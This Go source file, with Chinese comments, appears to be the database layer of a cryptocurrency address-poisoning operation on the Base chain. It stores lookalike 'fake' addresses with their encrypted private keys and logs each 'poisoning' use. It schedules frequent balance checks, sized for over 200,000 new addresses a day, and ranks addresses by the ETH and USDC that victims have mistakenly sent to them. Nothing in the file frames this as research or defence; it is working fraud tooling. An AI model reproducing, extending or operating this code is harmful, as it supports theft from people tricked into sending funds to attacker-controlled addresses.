package core

import (
	"context"
	"strings"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"go.uber.org/zap"
)

// UsedFakeAddress 已使用的伪造地址
type UsedFakeAddress struct {
	ID                  int64
	Address             string
	EncryptedPrivateKey []byte
	UseCount            int
	FirstUsedAt         time.Time
	LastUsedAt          time.Time
	ETHBalance          float64 // Base链使用ETH (数据库字段仍为bnb_balance)
	USDCBalance         float64 // Base链使用USDC (数据库字段仍为usdt_balance)
	LastBalanceCheck    *time.Time
	HasValue            bool
}

// UsedAddressStore 已使用伪造地址存储
type UsedAddressStore struct {
	db     *pgxpool.Pool
	logger *zap.Logger
}

// NewUsedAddressStore 创建存储实例
func NewUsedAddressStore(db *pgxpool.Pool, logger *zap.Logger) *UsedAddressStore {
	return &UsedAddressStore{
		db:     db,
		logger: logger,
	}
}

// EnsureTable 确保表存在
func (s *UsedAddressStore) EnsureTable(ctx context.Context) error {
	_, err := s.db.Exec(ctx, `
		CREATE TABLE IF NOT EXISTS used_fake_addresses (
			id BIGSERIAL PRIMARY KEY,
			address CHAR(40) NOT NULL,
			encrypted_private_key BYTEA NOT NULL,
			use_count INT NOT NULL DEFAULT 1,
			first_used_at TIMESTAMP NOT NULL DEFAULT NOW(),
			last_used_at TIMESTAMP NOT NULL DEFAULT NOW(),
			bnb_balance NUMERIC(36, 18) NOT NULL DEFAULT 0,
			usdt_balance NUMERIC(36, 18) NOT NULL DEFAULT 0,
			last_balance_check TIMESTAMP,
			has_value BOOLEAN NOT NULL DEFAULT FALSE
		);
		CREATE UNIQUE INDEX IF NOT EXISTS idx_used_fake_address_unique ON used_fake_addresses(address);
		CREATE INDEX IF NOT EXISTS idx_used_fake_has_value ON used_fake_addresses(has_value) WHERE has_value = TRUE;
		CREATE INDEX IF NOT EXISTS idx_used_fake_balance_check ON used_fake_addresses(last_balance_check NULLS FIRST);
	`)
	return err
}

// RecordUsedAddress 记录已使用的伪造地址
func (s *UsedAddressStore) RecordUsedAddress(ctx context.Context, address string, encryptedPrivateKey []byte) error {
	addr := strings.ToLower(strings.TrimPrefix(address, "0x"))

	_, err := s.db.Exec(ctx, `
		INSERT INTO used_fake_addresses (address, encrypted_private_key, use_count, first_used_at, last_used_at)
		VALUES ($1, $2, 1, NOW(), NOW())
		ON CONFLICT (address) DO UPDATE SET
			use_count = used_fake_addresses.use_count + 1,
			last_used_at = NOW()
	`, addr, encryptedPrivateKey)

	if err != nil {
		s.logger.Warn("记录已使用地址失败", zap.String("address", addr[:8]+"..."), zap.Error(err))
		return err
	}

	return nil
}

// UpdateBalance 更新地址余额 (Base链: ETH和USDC)
func (s *UsedAddressStore) UpdateBalance(ctx context.Context, address string, ethBalance, usdcBalance float64) error {
	addr := strings.ToLower(strings.TrimPrefix(address, "0x"))
	hasValue := ethBalance > 0.0001 || usdcBalance > 1 // ETH阈值更低

	_, err := s.db.Exec(ctx, `
		UPDATE used_fake_addresses SET
			bnb_balance = $2,
			usdt_balance = $3,
			last_balance_check = NOW(),
			has_value = $4
		WHERE address = $1
	`, addr, ethBalance, usdcBalance, hasValue)

	return err
}

// GetAddressesNeedCheck 获取需要检查余额的地址
// 分层策略（适应每日20万+新增地址）：
// 1. 优先层：有余额的地址 - 每5分钟检查
// 2. 新增层：24小时内投毒 - 每30分钟检查
// 3. 活跃层：1-7天内投毒 - 每6小时检查
// 4. 冷却层：7天以上 - 每24小时随机抽样5%
func (s *UsedAddressStore) GetAddressesNeedCheck(ctx context.Context, limit int) ([]UsedFakeAddress, error) {
	rows, err := s.db.Query(ctx, `
		WITH prioritized AS (
			SELECT id, address, encrypted_private_key, use_count, first_used_at, last_used_at,
			       bnb_balance, usdt_balance, last_balance_check, has_value,
			       CASE
			           -- 从未检查过的地址（最高优先级）
			           WHEN last_balance_check IS NULL THEN 0
			           -- 有余额的地址：每5分钟检查
			           WHEN has_value = TRUE AND last_balance_check < NOW() - INTERVAL '5 minutes' THEN 1
			           -- 24小时内投毒的地址：每30分钟检查
			           WHEN last_used_at > NOW() - INTERVAL '24 hours'
			                AND last_balance_check < NOW() - INTERVAL '30 minutes' THEN 2
			           -- 1-7天内投毒的地址：每6小时检查
			           WHEN last_used_at > NOW() - INTERVAL '7 days'
			                AND last_balance_check < NOW() - INTERVAL '6 hours' THEN 3
			           -- 7天以上的地址：每24小时检查，但用随机采样
			           WHEN last_used_at <= NOW() - INTERVAL '7 days'
			                AND last_balance_check < NOW() - INTERVAL '24 hours'
			                AND RANDOM() < 0.05 THEN 4
			           ELSE 99
			       END AS priority
			FROM used_fake_addresses
		)
		SELECT id, address, encrypted_private_key, use_count, first_used_at, last_used_at,
		       bnb_balance, usdt_balance, last_balance_check, has_value
		FROM prioritized
		WHERE priority < 99
		ORDER BY priority, last_used_at DESC
		LIMIT $1
	`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var addresses []UsedFakeAddress
	for rows.Next() {
		var a UsedFakeAddress
		var eth, usdc float64
		err := rows.Scan(&a.ID, &a.Address, &a.EncryptedPrivateKey, &a.UseCount,
			&a.FirstUsedAt, &a.LastUsedAt, &eth, &usdc, &a.LastBalanceCheck, &a.HasValue)
		if err != nil {
			continue
		}
		a.ETHBalance = eth
		a.USDCBalance = usdc
		addresses = append(addresses, a)
	}
	return addresses, nil
}

// GetValuableAddresses 获取有价值的地址 (分页)
func (s *UsedAddressStore) GetValuableAddresses(ctx context.Context, page, pageSize int) ([]UsedFakeAddress, int64, error) {
	// 获取总数
	var total int64
	err := s.db.QueryRow(ctx, `SELECT COUNT(*) FROM used_fake_addresses WHERE has_value = TRUE`).Scan(&total)
	if err != nil {
		return nil, 0, err
	}

	if total == 0 {
		return []UsedFakeAddress{}, 0, nil
	}

	// 获取分页数据
	offset := (page - 1) * pageSize
	rows, err := s.db.Query(ctx, `
		SELECT id, address, bnb_balance, usdt_balance, last_balance_check, use_count
		FROM used_fake_addresses
		WHERE has_value = TRUE
		ORDER BY (bnb_balance * 600 + usdt_balance) DESC
		LIMIT $1 OFFSET $2
	`, pageSize, offset)
	if err != nil {
		return nil, 0, err
	}
	defer rows.Close()

	var addresses []UsedFakeAddress
	for rows.Next() {
		var a UsedFakeAddress
		var eth, usdc float64
		err := rows.Scan(&a.ID, &a.Address, &eth, &usdc, &a.LastBalanceCheck, &a.UseCount)
		if err != nil {
			continue
		}
		a.ETHBalance = eth
		a.USDCBalance = usdc
		a.HasValue = true
		addresses = append(addresses, a)
	}

	return addresses, total, nil
}

// GetTotalCount 获取总地址数
func (s *UsedAddressStore) GetTotalCount(ctx context.Context) (int64, error) {
	var count int64
	err := s.db.QueryRow(ctx, `SELECT COUNT(*) FROM used_fake_addresses`).Scan(&count)
	return count, err
}

// GetStats 获取统计信息
func (s *UsedAddressStore) GetStats(ctx context.Context) (total, valuable int64, err error) {
	err = s.db.QueryRow(ctx, `SELECT COUNT(*) FROM used_fake_addresses`).Scan(&total)
	if err != nil {
		return
	}
	err = s.db.QueryRow(ctx, `SELECT COUNT(*) FROM used_fake_addresses WHERE has_value = TRUE`).Scan(&valuable)
	return
}
